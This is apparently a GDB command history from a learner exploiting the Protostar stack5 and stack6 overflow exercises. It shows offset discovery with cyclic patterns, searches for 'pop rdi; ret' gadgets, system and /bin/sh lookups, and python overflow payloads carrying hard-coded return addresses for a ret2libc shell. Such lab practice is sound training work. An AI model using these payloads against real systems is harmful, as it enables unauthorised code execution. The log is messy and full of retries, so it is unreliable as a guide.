r <<< `python -c 'print "A"*72 + "\x20\x14\xa3\xf7\xff\x7f\x00\x00" + "\x88\x5d\xb9\xf7\xff\x7f\x00\x00"'`
n
n
quit
r <<< `python -c 'print "A"*72 + "\x20\x14\xa3\xf7\xff\x7f\x00\x00" + "AAAA" +  "\x88\x5d\xb9\xf7\xff\x7f\x00\x00"'`
quit
r <<< `python -c 'print "A"*72 + "\x20\x14\xa3\xf7\xff\x7f\x00\x00" + "0000" +  "\x88\x5d\xb9\xf7\xff\x7f\x00\x00"'`
quit
r <<< `python -c 'print "A"*72 + "\x20\x14\xa3\xf7\xff\x7f\x00\x00" + "    " +  "\x88\x5d\xb9\xf7\xff\x7f\x00\x00"'`
quit
b main
quit
quit
backtrace
quit
b getpath
r
p system
quit
disas getpath
disas gotpath
disas getpath
disasm getpath
disas main
disassemble main
disassemble getpath
quit
b getpath
r
ropsearch 'pop rdi; ret'
ropsearch `pop rdi; ret`
ropgadget
quit
ropsearch `pop rdi; ret`
help
clear
p leave
r
./stack6
gdb -q stack6
gdb -q ./stack6
start
b getpath
r
n
ggf
quit
disas getpath
disassemble getpath
disassemble main
p getpath+130
b getpath
ropsearch 'pop rdi; ret'
r
ropsearch 'pop rdi; ret'
quit
disas main
disassemble main
b *main+20
pattern create 100
r
b *main+31
conti
pattern offset 'AAA%AAsAABAA$A'
pattern offset "AAA%AAsAABAA$A"
pattern offset AAA%AAsAABAA$A
pattern offset AAKAAgAA6AAL
p system
ropsearch 'pop rdi; ret'
quit
set disable-randomization off
show disable-randomization
./stack5
quit
disassemble main
b *main+38
patern create 100
pattern create 100
r
pattern offset AJAAfAA5AAKAAgAA6AAL
ropsearch 'pop rdi; ret'
quit
show disable-randomization
pattern offset AAA%AAsAABAA$A
disassemble main
b *main+38
pattern create 100
r
pattern offset IAAeAA4AAJAAfAA5AAKAAgAA6AAL
ropsearch 'pop rdi; ret'
ropsearch 'ret'
disassemble main
disassemble getpath
quit
b getpath
disassemble getpath
quit
disassemble getpath
quit
disassemble getpath
quit
disassemble main
info b
b infp
info break
b *main+38
quit
pattern crate 100
b main
r
pattern create 100
conti
quit
r
quit
disassemble main
b *main+38
r
quit
ropsearch 'pop rdi; ret'
disassemble main
b *main+38
r
ropsearch 'pop rdi; ret'
quit
disassemble getpath
break *getpath+131
r
ropresearch 'pop rdi; ret'
ropsearch 'pop rdi; ret'
search -s /bin/sh
r
quit
b main
r
search -s /bin/sh
quit
b main
r
search -s /bin/sh
quit
b main
r
search -s /bin/sh
quit
b main
p system
r
p system
q
search -s /bin/sh
b main
r
search -s /bin/sh
quit
b main
r
ropsearch 'pop rdi; ret'
quit
r <<< $(python -c 'print "A"*77"')
r <<< $(python -c 'print "A"*77')
ni
quit
quit
quit
r <<< $(python -c 'print "A"*77')
quit
r <<< $(python -c 'print "A"*77')
ni
quit
disas main
disassemble main
quit
b main
r <<< $(python -c 'print "A"*77')
ni
r <<< $(python -c 'print "A"*77')
ni
x/40wx $rbp-0x50
quit
r <<< $(python -c 'print "A"*80')
ni
quit
r <<< $(python -c 'print "A"*100')
disasemble main
disassemble main
quit
r <<< $(python -c 'print "A"*77')
quit
disassemble main
quit
r <<< $(python -c 'print "A"*77')
quit
disassemble main
quit
disassemble main
quit
disassemble main
quit
disassemble main
quit
disassemble main
quit
p system
b main
r
p system
search -s /bin/sh
ropsearch 'pop rdi; ret'
quit
disassemble main
disassemble main
quit
b main
disassemble main
b *main+26
continue
r
continue
ropsearch 'rop rdi; ret'
q
b main
ropsearch 'rop rdi; ret'
r
ropsearch 'rop rdi; ret'
ropsearch 'pop rdi; ret'
quit
disassemble main
quit
b getpath
b main
pattern create 100
r
continue
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
quit
disassemble main
b *main+15
pattern create 100
r
ni
pattern offset AAA%AAsAABAA$AAnAACA
ni
pattern offset AAKAAgAA6AAL
quit
disassemble main
b *main+26
pattern create 100
r
pattern offset AAKAAgAA6AAL
ropsearch 'pop rdi; ret'
disassemble main
quit
disassemble main
wq
quit
